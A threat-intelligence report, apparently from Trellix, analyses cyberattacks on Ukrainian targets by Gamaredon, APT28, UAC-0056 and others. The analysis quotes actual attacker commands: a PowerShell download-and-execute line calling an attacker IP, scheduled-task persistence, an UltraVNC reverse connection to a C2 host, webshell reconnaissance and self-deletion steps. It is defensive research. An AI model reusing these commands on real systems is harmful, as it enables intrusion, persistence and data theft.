Their tactics,\ntechniques, and procedures (TTPs) have not significantly evolved over time, although some\nchanges have been observed. Lately, the threat landscape has changed, as multiple\ndomains have partially merged. This trend was already on-going, but the increased digital\nactivity further accelerated and exposed said trend. This paper will cover the cybercriminal\nevolutions over time, the impact of a (cyber)war, observed activity, and finally a call to\naction.\n\n## Cybercriminal evolutions over time\n\n\n-----\n\nThe changes over time can be split into multiple evolutions, where each evolution is based\non the one prior. This section provides insight into these evolutions, in chronological order.\nAs these events unfolded organically, it is important to note that there is no exact date when\none transformed into another. The goal here is to provide a further understanding of the\nhistoric events which occurred prior to the latest, and still ongoing, transformation.\n\n## Cybercrime\n\nWhenever there is money to be made, there are people willing to risk it all. Some aren’t shy\nto break the law to gather a fortune, although each criminal individual’s actions differ, the\nresult is the same. The digital world is certainly no exception, where one can argue that the\nanonymous nature of online interactions might be an accelerant. Most offenders generally\noperate based on opportunity. A server which hasn’t been patched for years makes for an\neasy target, especially with publicly available tooling to exploit the discovered\nvulnerabilities.\n\n## Organized cybercrime\n\nThe next step, as is also seen in traditional crime, is for individuals to organize themselves.\nThe more generalist nature of the original cybercriminals required defenders to uphold a\ncertain level of security. The bundling of forces allows individuals to branch out into a\nspecific area of expertise. As such, the previously set security standards become\ninsufficient, thus requiring blue teams to raise the bar. With the additional knowledge,\ngroups can exploit vulnerabilities based on incomplete write-ups or partial proof-ofconcepts. Their targets are still opportunity based, allowing the actors to target a wider\nvariety of potential victims. The path of the least resistance is generally the most profitable\nhere.\n\n## Nation state campaigns\n\nNation state campaigns are often set up with a different goal than (organized) cybercrime.\nUsually, such actors conduct online espionage, potentially along with in-person espionage.\nThese groups are commonly characterized by their advanced methods, their persistent\nnature, and the threat they pose, commonly summarized as an Advanced Persistent Threat,\nabbreviated as APT. Their goal is to complete the set objective(s), without solely relying on\nopportunity.\n\nNaturally, misconfigured machines and publicly available exploits provide ample\nopportunities to these groups, as can be seen with the ProxyLogon and ProxyShell\nvulnerabilities and their aftermath. These groups are, in contrast to most (organized)\ncybercrime, able to find their own way into a given target. The more advanced nation states\nare capable of finding vulnerabilities and creating their own exploits for them, ahead of the\n\n\n-----\n\ngeneral public. This makes such an attack difficult to defend against, and the relentless\nnature of these groups drags the battle between the attacking and defending groups on,\nuntil the victim is either compromised, or no longer of strategic value for the attacker.\n\nAdditionally, nation state backed groups do not always opt to profit directly from their\nactivity. Taking systems hostage with ransomware, or simply wiping them using a wiper,\nimposes a cost on victims as they need to restore their systems, deal with downtime, and\nensure the integrity of the (seemingly) unaffected systems.\n\n## Merging domains\n\nLong has there been speculation with regards to nation state involvement in (organized)\ncybercrime. This is difficult to prove in general, and even with some proof, skeptics continue\n[to poke holes in the attribution. The leak of the Conti chats, more on which below, has](https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/conti-leaks-examining-the-panama-papers-of-ransomware.html)\nprovided solid evidence of the group’s ties with the Russian government. The amount of\nproof for such a claim is the first of its kind and allows analysts to view the exact\nconversations between actors. The criminals benefit by getting “immunity” of sorts, whereas\nthe nation state benefits from the covered operation under the flag of the actor. Especially in\nthe case when collaborating with a ransomware gang, such as Conti, the encrypted\nsystems provide little information about the intrusion and activities on the system. This\nfurther masks the actions that were performed on the system.\n\nSince many Ukraine government sites were taken offline by suspected Russian actors in\nJanuary 2022, Trellix Threat Labs has seen many parties involved, from civilian groups,\nsuch as the different ‘anonymous’ movements, to semi-government sponsored groups like\nthe ‘Ukrainian Cyber Army’, to nation-state groups that disrupt communication and\ninfrastructure. Each of them is leveraging open-source adversary tools in their attacks,\nwhich makes it difficult to attribute the attacks to one or more specific groups. In the image\nbelow, the distinct groups, and the most prevalent observed attack methods, Trellix Threat\nLabs has observed over time are given. They categorized into ‘AN_’ groups, the\nanonymous movement like groups; ‘Pro_’ groups, which are conducting attacks showing\ntheir allegiance towards one of the countries involved in the conflict; and ‘APT_’ groups,\nnation-state-sponsored groups.\n\n\n-----\n\nFigure 1. Overview of groups involved in the conflict.\n\nAs one can imagine, tracking activities on the social media platforms many of these groups\nare using can be challenging. From the information posted, one must consider: is it reliable,\nis it misinformation, is it propaganda, are images or data manipulated or backdoored?\n\nWith these attacks happening, the barriers which are traditionally seen between the\ndifferent actors are blurring. As barriers become distorted, filling out a diamond model of\nintrusion on the different actors involved gets more complicated because of the similar tools\nand techniques and targets.\n\n\n-----\n\nFigure 2. Fading barriers\n\nAs illustrated earlier on, the Conti ransomware group’s stance with regards to the Russian\ninvasion in Ukraine cost them, as their data was leaked, providing researchers not only with\nthe aforementioned chat leaks, but also a copy of the ransomware’s source code. A proUkrainian group, dubbed NB65, then took this source code and modified it, after which they\nstarted to attack targets in Russia. Due to the police’s protection, the actor’s own region is\noften left unaffected, a small price to pay to ensure little to no police involvement, making\nthis move rather unheard of. Below is a screenshot of the NB65’s ransomware note.\n\n\n-----\n\nFigure 3. Ransom note\n\nCybercriminal groups could have been used to gain access credentials from potential\ntargets. We have seen from the leaked Conti chats that the group was in contact with\ngovernment officials that asked for ‘information’ on compromised networks. Why spend\nresources gaining credentials when it is possible to ask cybercrime groups for access\ncredentials then offer ‘protection’? Once long-term access has been established,\nintelligence can be exfiltrated and during a conflict, disruptive actions can be executed, as\ncan be read about in the next section.\n\n## The impact of (cyber)war\n\nWith the ever-increasing intertwining of our digital and physical lives, the impact of a (digital)\n[war is increasing day by day. There’s been a lot of speculation about a “full blown cyberwar”](https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/war-weapons-and-wipers.html)\nprior to the Russian invasion. Something can be said in favor of these arguments, but when\nmissiles explode in your vicinity, computers aren’t that interesting anymore. Once the most\ndirect danger has passed, however, the digital domain is vital to securely and timely\ncommunicate with one another. It is also a safe way to perform reconnaissance, in contrast\nto sending a squad to scout a hostile area.\n\n\n-----\n\nTo support our customers and the people of Ukraine, Trellix Threat Labs coordinated with\nmultiple government institutions to provide them with the necessary telemetry insights,\nintelligence briefings and analysis of the malware tools used by Russian actors. A large\nportion of Trellix's efforts were performed in discretion as protection of our customers is our\nhighest priority.\n\n## Observed activity\n\nJust as physical warfare uses a multitude of military tactics and equipment, Trellix Threat\nLabs has observed similar activity on the cyberfront, including but not limited to wipers,\nspear-phishing, back-doors, vulnerabilities, and many other techniques. In the following\nsections, several of these activities will be highlighted, along with the attributed actors.\n\nInitially, we observed different groups using several tactics to gain access, gather\ninformation and credentials, and establish and maintain access to the victim’s networks.\nThe visualization below showcases which groups were observed, along with their initial\nattack modus operandi, after which they determined their next steps.\n\nFigure 4. Initial attack techniques used by observed groups\n\n## Gamaredon\n\nOver the years, the pro-Russian Gamaredon group has been digitally operating in Ukraine.\nTheir targets are mostly national institutes and government entities, based on Trellix Labs’\nobservations.\n\nFrom February to March 2022, we observed a Word document attached to a spear-phishing\ne-mail which was created to appear as a legitimate Ministry of Foreign Affairs document,\nwhile it was backdoored with a VBS script to download and install a persistent file on the\nvictim’s machine.\n\n\n-----\n\nFigure 5. Attack overview Gamaredon using backdoored Office documents\n\nFigure 6. Example of the document\n\nAfter opening this document, the script in the macro code was executed:\n\nFigure 7. Macro code example\n\n\n-----\n\nCleaning up the code, we observe the creation of a scheduled task. The task s schedule\nfrequency is set to minutes, where the modifier is set to 12.\n\n_Wscript.exe launching \"C:\\\\Windows\\\\System32\\\\schtasks.exe\" /Create /SC MINUTE /MO_\n_12 /F /tn Word.Downdloads /tr_\n\nThe scheduled task downloads the payload from this website:\n\n_hxxp://saprit.space/ACBFDE98.rar_\n\nAfter the download, the rar file is renamed to a .exe file and is saved as a vbs file:\n\n_C:\\\\Users\\\\3e837342b1d29db33fcb762a84f23aa5\\\\AppData\\\\Roaming\\\\Microsoft\\\\Excel\\\\_\n_ExelCreate_v.ACBFDE98.vbs_\n\nUnfortunately, the final payload was not available for analysis, but the pattern of intrusion\nand macro code were similar observed by others investigating this same actor.\n\nDuring that same timeframe, we observed a similar document used to target victims.\nAlthough both documents are dated (based on metadata, but we realize these can be\nmanipulated), it could either be a case of simulating an attack or re-using the same modus\noperandi with adjusted payloads.\n\nWhen the macro is executed in the second document, it follows the below steps:\n\nWinword.exe creating the file\n\"C:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\IndexOffice.vbs\"\nWscript.exe launching the process schtasks.exe with command line\n\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /MO 12 /F /tn\nWord.Downdloads /tr C:\\Users\\\n\\AppData\\Roaming\\Microsoft\\Office\\IndexOffice.vbs\nWscript.exe launching the process schtasks.exe with command line\n\"C:\\Windows\\System32\\schtasks.exe\" /Create /SC MINUTE /MO 15 /F /tn\nWord.Documents /tr\nC:\\Users\\\\AppData\\Roaming\\Microsoft\\Office\\IndexOffice.exe\nDownloads payload from hxxp://cornelius.website/WindowsNewsense.php\nAppends and creates the file ‘IndexOffice.vbs)\n\n## Phishing the Ukrainian Ministry of Defense\n\nIn March, we observed several phishing attempts trying to impersonate the Ministry of\nDefense of Ukraine. One email, sent on March 23rd, had the subject “Доступний новий\nресурс” (“A new resource is available” in English), and was sent to at least 42 recipients.\nThe URL in the message pointed to hxxp://file-milgov[.]systems/ and the domain resolved to\n\n\n-----\n\nthe following IP 93.95.227[.]226, which belongs to a hosting provider in Iceland. We were\nnot able to identify who might have setup these campaigns. In the bigger picture of\nobserving several tactics and techniques being used, this is another example of adversaries\ncan attempt to gain credentials from victim networks.\n\nUpon closer inspection of the webpage, it asks for a username and password and identifies\nitself as the “Міністерство Оборони України Файлове сховище”, which translates to\n“Ministry of Defense of Ukraine File Storage” in English.\n\nFigure 8. Fake login page\n\n\n-----\n\nWhen a user fills in credentials, the webpage responds with a small error message at the\nbottom of the page: “Невдала спроба входу” translates to “Unsuccessful login attempt”.\n\nFigure 9. The error message\n\nThe specific server had other error pages which mimicked another internal error: “Вибачте,\nна сервері ще ведуться технічні роботи”, which translates to “Sorry, the server is still\nundergoing technical work” in English.\n\n\n-----\n\nFigure 10. Different Error message found on the server\nThe same server, 82.221.139[.]137, also hosted an additional suspected phishing page.\nInteresting to note, the page features an explicit warning to turn JavaScript on, in order to\nuse this mail server contained on the page.\n\nFigure 11. Another suspected Phishing page.\n\nThe IP address 82.221.139[.]137 was observed in other spear phishing campaigns\nimpersonating the cybersecurity center and CSOC in Ukraine.\n\n## Wipers\n\n\n-----\n\nCommunication is vital to survive during wartime, and the adversarial use of malware\nattacks to “wipe” communication systems has been widespread in the region. A wiper’s sole\npurpose is to wipe the device it is executed on, and potentially other connected devices. If\nthe execution is successful, the device is rendered useless, and whether back-ups are\navailable or not, the machine does not function at all. The recovery of a single machine\nmight not take long, but the restoration of a company or government-wide attack may take\nmonths and cause disruption when communication, access to data, and coordination are\ncritical.\n\nWhen actors choose to use a wiper, they know that the weapon may be used against them.\nAside from the damage, it is often used as propaganda to demonstrate how ‘weak’ the\nenemy’s defenses are. In the diagram below, the different wiper families that have been\n[observed since the start of the conflict, including attribution, are visualized. Ember Bear and](https://www.crowdstrike.com/blog/who-is-ember-bear/)\n[APT28 are Russian nation state actor groups, where the other groups are likely to be pro-](https://attack.mitre.org/groups/G0007/)\nRussian or pro-Ukrainian, however not enough evidence is available to make those claims\nsolid.\n\nFigure 12. Wiper families and their attribution\n\nIt’s important to understand that to deploy a wiper, the actor needs access to the physical\ndisk, which requires administrator or system privileges. We have observed actors using\ntrusted tools and stolen certificates, mimicking ransomware, and employing several tactics\nto hide these attack-tools from being detected and ensure that access to the network\nremains available to the actor.\n\n\n-----\n\nIn one example, Trellix Threat Labs observed an actor access a victim s network with the\n[intent to wipe their systems. When the first wiper (dubbed WhisperGate) failed to execute, it](https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/return-of-pseudo-ransomware.html)\n[took the actors only two and a half hours to deploy another wiper (HermeticWiper) instead.](https://www.trellix.com/en-us/about/newsroom/stories/threat-labs/digging-into-hermeticwiper.html)\n\n## Targeted exchange servers\n\nOne of our Ukrainian clients also detected activities in March 2022, using vulnerabilities to\nattack the internal network and store the output in a file accessible from the Internet. In the\ncommand-lines below, we observe that the actor is gaining information from the system and\nwriting the output of the command towards the file ‘owafont_ua.css’ hosted on the OWA\nExchange webserver.\n\nChecking for the content of the ‘usoshared’ folder that is part of the Windows Update\nmechanism, we found the folder mostly contains etl files, files that contain system log\nevents from the Windows System Kernel:\n\nc:\\windows\\system32\\cmd.exe /c dir c:\\programdata\\usoshared > \"C:\\Program\nFiles\\Microsoft\\Exchange\n\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\resources\\owafont_ua.css\"\n\nHere the attacker is launching the command to discover if any scheduled tasks with details\nare present on the system:\n\nc:\\windows\\system32\\cmd.exe /c schtasks /query /v > \"C:\\Program\nFiles\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\resources\\owafont_ua.css\"\n\nQuerying systeminfo:\n\nc:\\windows\\system32\\cmd.exe /c systeminfo > \"C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\resources\\owafont_ua.css\"\n\nQuerying for task lists:\n\nc:\\windows\\system32\\cmd.exe /c tasklist >> \"C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\resources\\owafont_ua.css\"\n\nQuerying for active TCP network connections on the victim’s system:\n\nc:\\windows\\system32\\cmd.exe /c netstat -anbp tcp >> \"C:\\Program\nFiles\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\resources\\owafont_ua.css\"\n\nShowing the ARP table/cache on the host to discover more hosts on a network:\n\nc:\\windows\\system32\\cmd.exe /c arp -a >> \"C:\\Program Files\\Microsoft\\Exchange\nServer\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\current\\themes\\resources\\owafont_ua.css\"\n\n\n-----\n\nThese commands were executed in such a rapid manner that these were executed using a\nwebshell, stored on that same Exchange server.\n\n## UAC-0056\n\nIn April 2022, Trellix Labs observed indicators which the Ukrainian CERT has [attributed to](https://cert.gov.ua/article/37704)\nRussian threat group UAC-0056. The attack primarily targets the Ukrainian government and\nenergy sector.\n\nMalicious Excel documents were sent as attachments from a compromised email account.\nOnce the document was opened, either embedded code would be constructed and\nexecuted, or it would download the next stage from the Internet. The next stage ranges\nfrom implants to Cobalt Strike beacons. Compromised sites, Discord servers, and prestaged domains have been observed to store these implants. The implants go by the name\nGraphsteel and Grimplant and were implemented to steal user credentials, network\ninformation, and then exfiltrate said information in encrypted form to the C2 using a\nGoogle’s high performance Remote Procedure Call framework called gRPC.\n\nFigure 13. Attack overview GraphSteel and Grimplant\n\n## APT28\n\n\n-----\n\nOn April 18, 2022, a malicious email, presumably from a compromised ukr[.]net account,\nwith subject “ua_report”, was observed on one of our email gateways. This email attempted\nto lure the victim to open the attached compressed file with the following line “Operation\n‘The Eye of Sauron’ results” followed by the password needed to open the attachment.\n\nFigure 14. Attack flow overview APT28 attack\n\nOnce executed, the password protected self-extracting RAR will drop on the system an\nexecutable called “Doc_Viewer.exe” or “DocumentSaver.exe”, and a DLL called\n“SQLite.Interop.dll”. The executable is a .NET infostealer which uses the bundled DLL to\ninteract with various browser’s SQLite databases and extract the stored credentials and\ncookies. This activity was [reported by Google’s TAG and attributed to the infamous APT28](https://blog.google/threat-analysis-group/update-on-cyber-activity-in-eastern-europe/)\naka Fancy Bear threat actor, known for its ties with the Russian GRU.\n\nOn execution the infostealer will remove its traces, for stealthy purposes, by deleting the\nSQLite DLL and the malicious executable, as can be seen in the code below.\n\ncmd.exe /C Del SQLite.Interop.dll\n\ncmd.exe /C Del C:\\Users\\\\AppData\\Local\\Temp\\RarSFX0\\Doc_Viewer.exe\n\nThis is an example of the .NET malware stealing credentials, more specifically trying to\nobtain the stored cookies in the Firefox database. Cookies can contain values that can be\nabused to hijack the session from the user and impersonate as that user.\n\nFigure 15. Code example of grabbing cookie values\n\n\n-----\n\nAfter it is finished gathering stolen credentials, the .NET sample will leverage compromised\nIMAP credentials embedded on the sample to exfiltrate the stolen information. We have\nobserved the following compromised accounts used to connect to the indicated IMAP\nservers\n\nevents@sartoc.com - 144.208.77.]68:143\ngopal@hhaisoffice.com - 216.40.42.]5:143\n\n## DoubleDrop\n\nOn May 9, 2022, a government client in Ukraine received a spear phishing email to one of\ntheir general email addresses. The email contained a message pointing to a catalog\nincluded in a zip archive, which could be found at the given Google Drive URL:\ndrive.google.]com/file/d/1JBYjdNp5NnvJyYtR5azWBuRZZIjhto9z. To open the archive, the\nrecipient needs a password (“ ifYQFl” without quotes), which is enclosed within the e-mail's\nbody, as can be seen below.\n\n_Добрий день, мене звати Андрій, Я є співробітником ДК “Укроборонпром”. На_\n\n_сьогоднішній день у нас виникли потреби в доукомплектування, зокрема в_\n\n_даний момент актуальні деталі до БМП і патрони до стрілецької зброї, мені_\n_дали ваш контакт і сказали що ви можете посприяти в цьому напрямку. Що_\n\n_стосується юридичної частини ми направимо Вам офіційні листи.

Attack Flow Overview DoubleDrop\n\nThe LNK file contains a PowerShell reference command to be executed, which executes a\nbase64 encoded command in a hidden window. The decoded command is given below.\n\nNew-Object\n\n(System.New.WebClient).DownloadFile(“http://78.40.219.]13:8888/file”,\n“$env:temp\\helper.exe”);\n\nStart-Process -FilePath “$env:temp\\helper.exe” -ArgumentList “–host 46.229.215.108 –port\n4433” -WindowStyle Hidden;\n\nrm $pwd\\*.lnk;\n\nThe newly created web client is used to download the “helper.exe” file in the temporary file’s\ndirectory, from the given URL. Note that the added bracket is not present in the original\nscript but is used to defang the URL in this article. The newly downloaded executable is\nthen executed as a new process with a hidden window, together with four arguments which\nspecify the host and port to be used. At last, the LNK file, which originally started this\nexecution chain, is deleted.\n\nInvestigating one of the endpoints, we observe the following path:\n\n_C:\\Users\\*********\\AppData\\Local\\Temp\\helper.exe\\” –host 46.229.215.108 –port 4433_\n\nThe “helper.exe” binary is written in the GO language. Several anti-analysis tricks, such as\nobfuscating strings and garbage code, have been applied to make the analysis of this\nbinary more challenging.\n\n\n-----\n\nFrom the log files we observed that the helper.exe is querying the system information from\nthe registry and sends that onwards to the C2 server. Also, information from the Internet\nBrowser like cookies, form history, passwords and more are gathered and forwarded. From\nthe traffic analysis we can observe that the C2 server was hosting a special ‘data’ folder for\nit:\n\n_Post “https://46.229.215.]108:4433/data”: write tcp X.X.X.X:49202->46.229.215.108:4433:_\n_wsasend_\n\nAt the same time a batch script is installed and after initial information is gathered, it will\ndelete the helper.exe and the batch script:\n\nchcp 65001~~TaskKill /F /IM 3796~~Timeout /T 2 /Nobreak~~Del /a\n\\”C:\\Users\\********\\AppData\\Local\\Temp\\helper.exe\\\n\ncmd.exe \\”/C C:\\Users\\***\\AppData\\Local\\Temp/1.bat & Del 1.bat\\\n\nOverall, we observed a well setup operation, many parts attempting as much as possible to\ncircumvent detection to gather information that can be used to compromise the victim and\nget further access to the network.\n\n## Gamaredon activity\n\nTrellix Threat Labs detected the presence of an UltraVNC Remote Admin tool on one of our\nUkrainian customers. Remote admin tools are often used to bypass security controls. The\nexecutable was discovered in the following path:\n\nC:\\Users\\\\AppData\\Roaming\\wuauclt.exe –\n\ncedbbbc4deb6569c23aa20ac64ad1c2b2bef6f7b3405cef861f26a0b44d836d9\n\nPivoting from our initial data, we discovered, we found the parent SFX archive file.\n\n\n-----\n\nFigure 17. Attack Flow Overview\n\nThe self-extracting archive has the following commands:\n\nFigure 18. SFX Config Options\n\nThis will essentially extract the files in the archive to %APPDATA% folder and then execute\nthe 14991.cmd batch file.\n\nThe contents of the 14991.cmd batch file is as follows:\n\n\n-----\n\nFigure 19. Contents of the 14991.cmd file\n\nThis will essentially copy 31850.ini to wuauclt.exe and start wuauctl.exe with the following\ncommand line:\n\n\"%CD%\\wuauclt.exe\" -autoreconnect -id:%RANDOM% -connect torrentvnc.ddns[.]net:5612\n\nThe advantage of each of these command line options is as follows:\n\nwuauclt.exe – UltraVNC server disguised as windows update auto update client of\nMicrosoft\nautoreconnect - Attempt to reconnect to the listening viewer if the connection drops\nconnect – Reverse-connect to the repeater host on specific host and port, this is used\nto bypass any firewall restrictions since the connection is initiated by the victim\nid – serves as a unique UltraVNC server identifier to the repeater, the advantage of\nthis repeater setup is primarily two-fold:\n\nIt allows for connections to multiple servers; this gives attacker the ability to use\nthe same payload for all victims and attacker can also simply change this\nrepeater C2 host if they want to reuse payload in a future campaign\nThe Repeater host acts as a proxy for the server and the viewer; this gives\nattacker the ability to mask the real host on which he is running the UltraVNC\nviewer\n\nUltraVNC.ini is the UltraVNC configuration file that will be consumed by UltraVNC server.\nThe files rc4.key, MSRC4Plugin_for_sc.dsm are also consumed by the UltraVNC server\nprogram to encrypt the UltraVNC network traffic.\n\n## A call to action\n\nTrellix has historically had a significant customer base in Ukraine and when the\ncyberattacks targeting the country intensified, we coordinated closely with government and\nindustry partners to provide greater visibility into the evolving threat landscape. We have\nbeen eager to support the region against malicious cyber activity and have been able to go\n\n\n-----\n\nbeyond sharing knowledge to also provide a wide range of security appliances at no cost in\nthe affected region (our special thanks go out to our partners at Mandiant in getting some of\nthe appliances deployed at those organizations who needed protection the most).\n\n\n-----",
